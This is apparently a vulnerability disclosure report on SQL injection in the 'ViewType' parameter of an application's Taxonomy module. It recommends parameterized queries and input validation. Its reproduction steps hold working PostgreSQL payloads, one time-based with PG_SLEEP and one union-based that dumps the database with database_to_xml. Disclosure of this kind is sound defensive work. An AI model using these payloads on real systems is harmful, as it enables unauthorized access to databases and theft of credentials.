# SQL Injection (Union-Based and Time-Based)

## **Description**  
The application’s reliance on weak SQL query construction and inadequate input validation has introduced a critical vulnerability to SQL injection attacks. This flaw allows attackers to exploit union-based and time-based techniques to manipulate SQL queries, gain unauthorized access to sensitive data, and compromise the database's integrity. The vulnerability was identified in the **"ViewType"** parameter, which lacks proper sanitization and validation, enabling malicious payloads to bypass security mechanisms. Key functions such as **findByWhereClause** further contribute to the issue by directly integrating unsanitized user input into SQL statements.

---

## **Summary**  
The identified SQL injection vulnerability in the application's **Taxonomy** module poses a **critical risk** to sensitive data and operational continuity. Attackers can execute unauthorized queries, exfiltrate sensitive data, and disrupt database operations using union-based and time-based techniques. Immediate implementation of parameterized queries, rigorous input validation, and secure coding practices is essential to mitigate this risk and prevent catastrophic data breaches.

---

## **Steps to Reproduce**  

1. **Access the Application**  
   - Log in with a **SilverAdmin** account.

2. **Navigate to Taxonomy**  
   - Go to **Back office > Taxonomy > Axis** and inspect the "Primary topics" view.

3. **Inject Payloads into the "ViewType" Parameter**  
   - **Time-Based Injection Payload:**  
     ```sql
     P'%3bSelect+PG_SLEEP(10)--
     ```  
     Observe the delayed server response to confirm the vulnerability.

   - **Union-Based Injection Payload:**  
     ```sql
     PP%27++UNION+SELECT+NULL::integer,NULL::character(1),NULL::character+varying(10),NULL::character+varying(255),(select+database_to_xml(true,true,%27%27)::character+varying+as+xml_representation),NULL::character(2),NULL::character+varying(255),9,9--+Test
     ```  
     This payload successfully extracts sensitive database information, including user credentials.

4. **Observe the Results**  
   - Verify delayed responses for time-based payloads or data leaks from union-based payloads.
